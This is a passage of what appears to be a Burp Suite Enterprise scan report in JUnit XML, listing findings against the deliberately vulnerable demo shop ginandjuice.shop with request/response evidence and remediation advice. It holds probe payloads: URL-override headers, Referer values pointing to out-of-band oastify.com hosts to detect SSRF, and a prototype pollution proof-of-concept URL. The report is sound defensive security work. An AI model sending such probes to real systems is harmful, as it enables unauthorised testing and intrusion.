+Cookie: AWSALB=4T8VKB8tC0nMpBOo1nWZE+a29GvjykUT9LBu1IqEsSuDNSsYeOMTsFWG1WuwrEWM6oCm9oqQ81U3bybV+kgAFaXtGfgZdXgE34N1pdlKWe6xV2dwbFcLhCOuKHwS; AWSALBCORS=4T8VKB8tC0nMpBOo1nWZE+a29GvjykUT9LBu1IqEsSuDNSsYeOMTsFWG1WuwrEWM6oCm9oqQ81U3bybV+kgAFaXtGfgZdXgE34N1pdlKWe6xV2dwbFcLhCOuKHwS; session=9efVrrELtv7F9ETg6SQINlSh2Z3wjpPB
+
+
+
+Response 2:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:57:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 11166
+Set-Cookie: AWSALB=1fMBYeUe7wvtVjnC2oWlhohog2JdSfipZJEeKe2vUXh0hpejbG9QBjiWtqztz2I6wdy1VhjUl2o4cGKcacy/bTGGWDLDuVZL73LOhPx7WtvaNsTu/OlcyR7HIEX1; Expires=Thu, 14 Sep 2023 10:57:56 GMT; Path=/
+Set-Cookie: AWSALBCORS=1fMBYeUe7wvtVjnC2oWlhohog2JdSfipZJEeKe2vUXh0hpejbG9QBjiWtqztz2I6wdy1VhjUl2o4cGKcacy/bTGGWDLDuVZL73LOhPx7WtvaNsTu/OlcyR7HIEX1; Expires=Thu, 14 Sep 2023 10:57:56 GMT; Path=/; SameSite=None; Secure
+X-Backend: e7a902ee-3367-41d2-b8f7-3a27ac1bb398
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip
+
+Request 3:
+GET /blog HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/
+Cookie: AWSALB=ens3L2mJJlSDyFK9SH2vOjzrtWvfvDiMPEx4dlPk1EIYnOInKgCWU/M/XMZoCCJqb242JdG5JUys84r/d4A4RMuDSV1LyLn+shBl2hKd1zqXFa1cNogaP6BnsVx9; AWSALBCORS=ens3L2mJJlSDyFK9SH2vOjzrtWvfvDiMPEx4dlPk1EIYnOInKgCWU/M/XMZoCCJqb242JdG5JUys84r/d4A4RMuDSV1LyLn+shBl2hKd1zqXFa1cNogaP6BnsVx9; session=zh0rKIoJluLGpUI6Gy8ZOkDc7ETp2G74
+
+
+
+Response 3:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:59:21 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 10923
+Set-Cookie: AWSALB=TfeeKJ6WOGDQdXlrSiQOeSUD+c1dCWxhxRgPwof/xQuAl2iE1SUId8OZe6iG/j/piRbOsrvZrGrr5HkuAk8QfPGer9fE3blolovK3SxBMwXms5HQu8qc3IWkaa/6; Expires=Thu, 14 Sep 2023 10:59:21 GMT; Path=/
+Set-Cookie: AWSALBCORS=TfeeKJ6WOGDQdXlrSiQOeSUD+c1dCWxhxRgPwof/xQuAl2iE1SUId8OZe6iG/j/piRbOsrvZrGrr5HkuAk8QfPGer9fE3blolovK3SxBMwXms5HQu8qc3IWkaa/6; Expires=Thu, 14 Sep 2023 10:59:21 GMT; Path=/; SameSite=None; Secure
+X-Backend: 83d2f1c0-3646-4d71-b845-23891f48ae04
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsBlog.css rel=stylesheet>
+<link href=/resourSnip
+
+
+
+References
+
+- Web Security Academy: Exploiting XSS vulnerabilities (https://portswigger.net/web-security/cross-site-scripting/exploiting)
+
+- HttpOnly effectiveness (https://portswigger.net/research/web-storage-the-lesser-evil-for-session-tokens#httponly)
+
+
+
+Vulnerability Classifications
+
+- CWE-16: Configuration (https://cwe.mitre.org/data/definitions/16.html)
+
+- CAPEC-31: Accessing/Intercepting/Modifying HTTP Cookies (https://capec.mitre.org/data/definitions/31.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="Cacheable HTTPS response">
+            <failure message="Cacheable HTTPS response found at https://ginandjuice.shop/" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Certain
+
+Host: https://ginandjuice.shop
+
+Path: /
+
+
+Issue Detail
+This issue was found in multiple locations under the reported path.
+
+Issue Background
+Unless directed otherwise, browsers may store a local cached copy of content received from web servers. Some browsers, including Internet Explorer, cache content accessed via HTTPS. If sensitive information in application responses is stored in the local cache, then this may be retrieved by other users who have access to the same computer at a future time.
+
+
+Issue Remediation
+Applications should return caching directives instructing browsers not to store local copies of any sensitive data. Often, this can be achieved by configuring the web server to prevent caching for relevant paths within the web root. Alternatively, most web development platforms allow you to control the server's caching directives from within individual scripts. Ideally, the web server should return the following HTTP headers in all responses containing sensitive content:
+
+
+
+- Cache-control: no-store
+- Pragma: no-cache
+
+
+Evidence
+Request 1:
+GET / HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+
+
+Response 1:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:57:22 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 10445
+Set-Cookie: AWSALB=FF0hm2CTc6gZyG3tmlgtFDSmd/mqoJz0ZN4q1iJFXf6niFw0ihEe3w4rgxdA/BuYWpzh5y1P9cLWksVOOjokrrz7Axur7n1l+6guNyLCcqE7+0HIoA7ocVAqwqta; Expires=Thu, 14 Sep 2023 10:57:22 GMT; Path=/
+Set-Cookie: AWSALBCORS=FF0hm2CTc6gZyG3tmlgtFDSmd/mqoJz0ZN4q1iJFXf6niFw0ihEe3w4rgxdA/BuYWpzh5y1P9cLWksVOOjokrrz7Axur7n1l+6guNyLCcqE7+0HIoA7ocVAqwqta; Expires=Thu, 14 Sep 2023 10:57:22 GMT; Path=/; SameSite=None; Secure
+Set-Cookie: session=fDNmZgyGLRpm6ztQh5D98FlnnK1PnZW8; Secure; HttpOnly; SameSite=None
+X-Backend: 34c34acf-1989-4fa4-8141-e1982bbd3217
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip
+
+Request 2:
+GET /about HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/
+Cookie: AWSALB=4T8VKB8tC0nMpBOo1nWZE+a29GvjykUT9LBu1IqEsSuDNSsYeOMTsFWG1WuwrEWM6oCm9oqQ81U3bybV+kgAFaXtGfgZdXgE34N1pdlKWe6xV2dwbFcLhCOuKHwS; AWSALBCORS=4T8VKB8tC0nMpBOo1nWZE+a29GvjykUT9LBu1IqEsSuDNSsYeOMTsFWG1WuwrEWM6oCm9oqQ81U3bybV+kgAFaXtGfgZdXgE34N1pdlKWe6xV2dwbFcLhCOuKHwS; session=9efVrrELtv7F9ETg6SQINlSh2Z3wjpPB
+
+
+
+Response 2:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:57:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 11166
+Set-Cookie: AWSALB=1fMBYeUe7wvtVjnC2oWlhohog2JdSfipZJEeKe2vUXh0hpejbG9QBjiWtqztz2I6wdy1VhjUl2o4cGKcacy/bTGGWDLDuVZL73LOhPx7WtvaNsTu/OlcyR7HIEX1; Expires=Thu, 14 Sep 2023 10:57:56 GMT; Path=/
+Set-Cookie: AWSALBCORS=1fMBYeUe7wvtVjnC2oWlhohog2JdSfipZJEeKe2vUXh0hpejbG9QBjiWtqztz2I6wdy1VhjUl2o4cGKcacy/bTGGWDLDuVZL73LOhPx7WtvaNsTu/OlcyR7HIEX1; Expires=Thu, 14 Sep 2023 10:57:56 GMT; Path=/; SameSite=None; Secure
+X-Backend: e7a902ee-3367-41d2-b8f7-3a27ac1bb398
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip
+
+Request 3:
+GET /blog HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/
+Cookie: AWSALB=ens3L2mJJlSDyFK9SH2vOjzrtWvfvDiMPEx4dlPk1EIYnOInKgCWU/M/XMZoCCJqb242JdG5JUys84r/d4A4RMuDSV1LyLn+shBl2hKd1zqXFa1cNogaP6BnsVx9; AWSALBCORS=ens3L2mJJlSDyFK9SH2vOjzrtWvfvDiMPEx4dlPk1EIYnOInKgCWU/M/XMZoCCJqb242JdG5JUys84r/d4A4RMuDSV1LyLn+shBl2hKd1zqXFa1cNogaP6BnsVx9; session=zh0rKIoJluLGpUI6Gy8ZOkDc7ETp2G74
+
+
+
+Response 3:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:59:21 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 10923
+Set-Cookie: AWSALB=TfeeKJ6WOGDQdXlrSiQOeSUD+c1dCWxhxRgPwof/xQuAl2iE1SUId8OZe6iG/j/piRbOsrvZrGrr5HkuAk8QfPGer9fE3blolovK3SxBMwXms5HQu8qc3IWkaa/6; Expires=Thu, 14 Sep 2023 10:59:21 GMT; Path=/
+Set-Cookie: AWSALBCORS=TfeeKJ6WOGDQdXlrSiQOeSUD+c1dCWxhxRgPwof/xQuAl2iE1SUId8OZe6iG/j/piRbOsrvZrGrr5HkuAk8QfPGer9fE3blolovK3SxBMwXms5HQu8qc3IWkaa/6; Expires=Thu, 14 Sep 2023 10:59:21 GMT; Path=/; SameSite=None; Secure
+X-Backend: 83d2f1c0-3646-4d71-b845-23891f48ae04
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsBlog.css rel=stylesheet>
+<link href=/resourSnip
+
+
+
+References
+    
+- Web Security Academy: Information disclosure (https://portswigger.net/web-security/information-disclosure)
+
+
+
+Vulnerability Classifications
+
+- CWE-524: Information Exposure Through Caching (https://cwe.mitre.org/data/definitions/524.html)
+
+- CWE-525: Information Exposure Through Browser Caching (https://cwe.mitre.org/data/definitions/525.html)
+
+- CAPEC-37: Retrieve Embedded Sensitive Data (https://capec.mitre.org/data/definitions/37.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="Request URL override">
+            <failure message="Request URL override found at https://ginandjuice.shop/" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Tentative
+
+Host: https://ginandjuice.shop
+
+Path: /
+
+
+Issue Detail
+The application appears to support the use of a custom HTTP header to override the URL.
+
+Burp added the following headers to the request:
+
+X-Original-URL: /6r4sh5dqyn?6r4sh5dqyn=1
+X-Rewrite-URL: /6r4sh5dqyn?6r4sh5dqyn=1
+
+This changed the status code from 200 to 404, suggesting that the header was processed.
+
+Issue Background
+Some applications and frameworks support HTTP headers that can be used to override parts of the request URL, potentially affecting the routing and processing of the request.
+
+Intermediate systems are often oblivious to these headers. In the case of reverse proxies and web application firewalls, this can lead to security rulesets being bypassed. If a caching system is in place, this may enable cache poisoning attacks. These headers may also enable forging of log entries. 
+
+Even if the application is intended to be accessed directly, some visitors may be using a corporate proxy enabling localised cache poisoning. 
+
+
+Issue Remediation
+To fully resolve this issue, locate the component that processes the affected headers, and disable it entirely.
+If you are using a framework, applying any pending security updates may do this for you.
+
+If this isn't practical, an alternative workaround is to configure an intermediate system to automatically strip the affected headers before they are processed.
+
+
+Evidence
+Request 1:
+GET /?3udscekmg7=1 HTTP/1.1
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+X-Original-URL: /6r4sh5dqyn?6r4sh5dqyn=1
+X-Rewrite-URL: /6r4sh5dqyn?6r4sh5dqyn=1
+
+
+
+Response 1:
+HTTP/1.1 404 Not Found
+Date: Thu, 07 Sep 2023 10:59:48 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 7308
+Connection: close
+Set-Cookie: AWSALB=OttfMaeSBsza0ZR+H/e7axIBSB9phMR0k7jzKF+nkp1uBWy4EcnZjUeiauEqKhDaiMROiqrAXBgOPfZ38W8Yas0ElrdOYLNM7dlBi+mD8LuBiLHxPrDFlb6qz+zo; Expires=Thu, 14 Sep 2023 10:59:48 GMT; Path=/
+Set-Cookie: AWSALBCORS=OttfMaeSBsza0ZR+H/e7axIBSB9phMR0k7jzKF+nkp1uBWy4EcnZjUeiauEqKhDaiMROiqrAXBgOPfZ38W8Yas0ElrdOYLNM7dlBi+mD8LuBiLHxPrDFlb6qz+zo; Expires=Thu, 14 Sep 2023 10:59:48 GMT; Path=/; SameSite=None; Secure
+Set-Cookie: session=QakEZ1pu9uAVeHdIgqKy6XA8Ghx3iq5G; Secure; HttpOnly; SameSite=None
+X-Backend: 7c3415f0-3cb0-4b98-82dd-8b57749042b7
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip
+
+Request 2:
+GET /?3wm7vkbcjw=1 HTTP/1.1
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+X-Original-URL: /
+X-Rewrite-URL: /
+
+
+
+Response 2:
+HTTP/1.1 200 OK
+Date: Thu, 07 Sep 2023 10:59:49 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 10445
+Connection: close
+Set-Cookie: AWSALB=lbC+oEj0GW6A4er8pn0Bh0J5w5vnZOdP3NVsugFDYDCnaibhGVxFxmHdSi/vCIJDc0emn+FpNVMNN+acFkj0KWLc3IGU4UMsPCxGmchlx0pe12fBNjcPxEY4ST/w; Expires=Thu, 14 Sep 2023 10:59:49 GMT; Path=/
+Set-Cookie: AWSALBCORS=lbC+oEj0GW6A4er8pn0Bh0J5w5vnZOdP3NVsugFDYDCnaibhGVxFxmHdSi/vCIJDc0emn+FpNVMNN+acFkj0KWLc3IGU4UMsPCxGmchlx0pe12fBNjcPxEY4ST/w; Expires=Thu, 14 Sep 2023 10:59:49 GMT; Path=/; SameSite=None; Secure
+Set-Cookie: session=9ArqLGKTg4zmd9UllHa4P99NhyPXkIKo; Secure; HttpOnly; SameSite=None
+X-Backend: 77f6218a-0cf1-40a4-8590-b355c8c38596
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip
+
+
+
+References
+    
+- Web Security Academy: HTTP Host header attacks (https://portswigger.net/web-security/host-header)
+
+- Web Security Academy: Web cache poisoning (https://portswigger.net/web-security/web-cache-poisoning)
+
+- Practical Web Cache Poisoning (https://portswigger.net/blog/practical-web-cache-poisoning)
+
+
+
+Vulnerability Classifications
+    
+- CWE-436: Interpretation Conflict (https://cwe.mitre.org/data/definitions/436.html)
+
+- CAPEC-141: Cache Poisoning (https://capec.mitre.org/data/definitions/141.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="External service interaction (DNS)">
+            <failure message="External service interaction (DNS) found at https://ginandjuice.shop/" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Certain
+
+Host: https://ginandjuice.shop
+
+Path: /
+
+
+Issue Detail
+It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.
+
+The payload 3x1givae0u422vrfp5hddzvp1g79v1juei45utj.oastify.com was submitted in the HTTP Referer header.
+
+The application performed a DNS lookup of the specified domain.
+
+Issue Background
+The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.
+
+If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.
+
+The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.
+
+
+Issue Remediation
+You should review the purpose and intended use of the relevant application functionality,
+and determine whether the ability to trigger arbitrary external service interactions is intended behavior.
+If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures.
+These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.
+
+If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.
+
+
+Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.
+
+
+Evidence
+Request:
+GET / HTTP/1.1
+Host: ginandjuice.shop
+Referer: http://3x1givae0u422vrfp5hddzvp1g79v1juei45utj.oastify.com/
+Pragma: no-cache
+Cache-Control: no-cache, no-transform
+Connection: close
+
+
+
+Response:
+HTTP/1.1 200 OK
+Date: Thu, 07 Sep 2023 10:59:56 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 10445
+Connection: close
+Set-Cookie: AWSALB=AjoEgxeG6FnZbv/qyJnk1ffrdS18HNSCKIh1VSBcQWrsydwrvtp9BKBlbKJv4bQENvi3tI2dmYcXiMFvdPzoePh7M7TXXiFtmtDTSUqymcZftg3i1Bvv3nTwT0Vl; Expires=Thu, 14 Sep 2023 10:59:56 GMT; Path=/
+Set-Cookie: AWSALBCORS=AjoEgxeG6FnZbv/qyJnk1ffrdS18HNSCKIh1VSBcQWrsydwrvtp9BKBlbKJv4bQENvi3tI2dmYcXiMFvdPzoePh7M7TXXiFtmtDTSUqymcZftg3i1Bvv3nTwT0Vl; Expires=Thu, 14 Sep 2023 10:59:56 GMT; Path=/; SameSite=None; Secure
+Set-Cookie: session=IwO7FWl7hqvKOS8h2JCg2ahurIsZRCWu; Secure; HttpOnly; SameSite=None
+X-Backend: e7a902ee-3367-41d2-b8f7-3a27ac1bb398
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip
+
+Collaborator DNS interaction:
+
+
+The Collaborator server received a DNS lookup of type A for the domain name 3x1givae0u422vrfp5hddzvp1g79v1juei45utj.oastify.com.
+
+ The lookup was received from IP address 3.251.120.107:30624 at 2023-Sep-07 10:59:56.362 UTC.
+
+
+
+
+
+
+References
+  
+- Burp Collaborator (https://portswigger.net/blog/introducing-burp-collaborator)
+
+- Out-of-band application security testing (OAST) (https://portswigger.net/burp/application-security-testing/oast)
+
+- PortSwigger Research: Cracking the Lens (https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)
+
+
+
+Vulnerability Classifications
+
+- CWE-918: Server-Side Request Forgery (SSRF) (https://cwe.mitre.org/data/definitions/918.html)
+
+- CWE-406: Insufficient Control of Network Message Volume (Network Amplification) (https://cwe.mitre.org/data/definitions/406.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+        <testcase name="External service interaction (HTTP)">
+            <failure message="External service interaction (HTTP) found at https://ginandjuice.shop/" type="High"><![CDATA[
+Severity: High
+
+Confidence: Certain
+
+Host: https://ginandjuice.shop
+
+Path: /
+
+
+Issue Detail
+It is possible to induce the application to perform server-side HTTP requests to arbitrary domains.
+
+The payload 6cjjxyphfxj5hy6i48wgs2asgjmca4yxtlj89wy.oastify.com was submitted in the HTTP Referer header.
+
+The application performed an HTTP request to the specified domain.
+
+Issue Background
+External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
+However, in many cases, it can indicate a vulnerability with serious consequences.
+
+The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
+By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with.
+This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself.
+Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. 
+
+
+Issue Remediation
+You should review the purpose and intended use of the relevant application functionality,
+and determine whether the ability to trigger arbitrary external service interactions is intended behavior.
+If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures.
+These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.
+
+If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.
+
+
+Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.
+
+
+Evidence
+Request:
+GET / HTTP/1.1
+Host: ginandjuice.shop
+Referer: http://6cjjxyphfxj5hy6i48wgs2asgjmca4yxtlj89wy.oastify.com/
+Pragma: no-cache
+Cache-Control: no-cache, no-transform
+Connection: close
+
+
+
+Response:
+HTTP/1.1 200 OK
+Date: Thu, 07 Sep 2023 10:59:58 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 10445
+Connection: close
+Set-Cookie: AWSALB=Nt8KkIxOzBwlMmUjYWFl9jjHvTO9HAah5oymVYwOJAtGt7hCMpamvClTigSSe1MysZFz/p2oAycUCoCSLuCOk58jlmOJUH00aoqjHfpGP0kAooWnafr05OVVrhN8; Expires=Thu, 14 Sep 2023 10:59:58 GMT; Path=/
+Set-Cookie: AWSALBCORS=Nt8KkIxOzBwlMmUjYWFl9jjHvTO9HAah5oymVYwOJAtGt7hCMpamvClTigSSe1MysZFz/p2oAycUCoCSLuCOk58jlmOJUH00aoqjHfpGP0kAooWnafr05OVVrhN8; Expires=Thu, 14 Sep 2023 10:59:58 GMT; Path=/; SameSite=None; Secure
+Set-Cookie: session=XIuy5Gicwj1d7TJcIzix1YkeiQp9XcWF; Secure; HttpOnly; SameSite=None
+X-Backend: 77f6218a-0cf1-40a4-8590-b355c8c38596
+X-Frame-Options: SAMEORIGIN
+
+<!DOCTYPE html>
+<html>
+<head>
+<link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
+<link href=/resources/css/labsScanme.css rel=stylesheet>
+<meta name="viewSnip
+
+Collaborator HTTP interaction:
+
+
+
+The Collaborator server received an HTTP request.
+
+ The request was received from IP address 54.170.155.72:38054 at 2023-Sep-07 10:59:58.892 UTC.
+
+
+
+
+Request to collaborator
+GET / HTTP/1.1
+Host: 6cjjxyphfxj5hy6i48wgs2asgjmca4yxtlj89wy.oastify.com
+User-Agent: ginandjuice.shop; support@portswigger.net
+X-Forwarded-For: 10.0.4.249
+Accept-Encoding: gzip
+
+
+
+Response from collaborator
+HTTP/1.1 200 OK
+Server: Burp Collaborator https://burpcollaborator.net/
+X-Collaborator-Version: 4
+Content-Type: text/html
+Content-Length: 62
+
+<html><body>5d7kbi8w0qlzcqik0oeaiyzjlgkglngifigz</body></html>
+
+
+
+
+
+References
+  
+- Burp Collaborator (https://portswigger.net/blog/introducing-burp-collaborator)
+
+- Out-of-band application security testing (OAST) (https://portswigger.net/burp/application-security-testing/oast)
+
+- PortSwigger Research: Cracking the Lens (https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)
+
+
+
+Vulnerability Classifications
+
+- CWE-918: Server-Side Request Forgery (SSRF) (https://cwe.mitre.org/data/definitions/918.html)
+
+- CWE-406: Insufficient Control of Network Message Volume (Network Amplification) (https://cwe.mitre.org/data/definitions/406.html)
+
+
+
+Reported by Burp Suite Enterprise: https://portswigger.net/kb/issues
+]]></failure>
+        </testcase>
+    </testsuite>
+    <testsuite failures="0" name="https://ginandjuice.shop:443/about" tests="1">
+        <testcase name="No issues were identified"/>
+    </testsuite>
+    <testsuite failures="1" name="https://ginandjuice.shop:443/blog" tests="1">
+        <testcase name="Client-side prototype pollution">
+            <failure message="Client-side prototype pollution found at https://ginandjuice.shop/blog" type="Info"><![CDATA[
+Severity: Info
+
+Confidence: Firm
+
+Host: https://ginandjuice.shop
+
+Path: /blog
+
+
+Issue Detail
+The client-side prototype pollution source __proto__[property]=value was found on this web site. The payload was injected into the query string part of the URL and the payload was later detected in the Object.prototype indicating that this website is vulnerable to client-side prototype pollution. This proof-of-concept demonstrates it's possible to control the Object.prototype via the query string.
+The following URL, https://ginandjuice.shop/blog?__proto__[dcb52823]=vz084bkeo6, can be used as a proof of concept. 
+In order to exploit this vulnerability a relevant client-side prototype pollution gadget is required as well as this prototype pollution source. We recommend using DOM Invader (https://portswigger.net/blog/introducing-dom-invader) (a browser extension part of Burp Suite's embedded browser) to confirm this vulnerability and scan for gadgets.
+
+
+Issue Background
+
+A client-side prototype pollution source is any user-controlled JSON property, query string, or hash parameter that is converted to a JavaScript object and then merged with another object. This enables an attacker to use property keys, such as __proto__, to assign properties to the Object.prototype or other global prototypes.
+
+
+
+Client-side prototype pollution is not a vulnerability in its own right. However, when paired with a gadget, this may lead to vulnerabilities such as DOM XSS, which could enable the attacker to control JavaScript on the page.
+
+
+
+Issue Remediation
+
+Ensure that property keys, such as __proto__, constructor, and prototype are correctly filtered when merging objects. When creating objects, we recommend using the Object.create(null) API to ensure that your object does not inherit from the Object.prototype and, therefore, won't be vulnerable to prototype pollution.
+
+
+
+Evidence
+Request:
+GET /blog HTTP/2
+Host: ginandjuice.shop
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: https://ginandjuice.shop/
+Cookie: AWSALB=ens3L2mJJlSDyFK9SH2vOjzrtWvfvDiMPEx4dlPk1EIYnOInKgCWU/M/XMZoCCJqb242JdG5JUys84r/d4A4RMuDSV1LyLn+shBl2hKd1zqXFa1cNogaP6BnsVx9; AWSALBCORS=ens3L2mJJlSDyFK9SH2vOjzrtWvfvDiMPEx4dlPk1EIYnOInKgCWU/M/XMZoCCJqb242JdG5JUys84r/d4A4RMuDSV1LyLn+shBl2hKd1zqXFa1cNogaP6BnsVx9; session=zh0rKIoJluLGpUI6Gy8ZOkDc7ETp2G74
+
+
+
+Response:
+HTTP/2 200 OK
+Date: Thu, 07 Sep 2023 10:59:21 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 10923
+Set-Cookie: AWSALB=TfeeKJ6WOGDQdXlrSiQOeSUD+c1dCWxhxRgPwof/xQuAl2iE1SUId8OZe6iG/j/piRbOsrvZrGrr5HkuAk8QfPGer9fE3blolovK3SxBMwXms5HQu8qc3IWkaa/6; Expires=Thu, 14 Sep 2023 10:59:21 GMT; Path=/
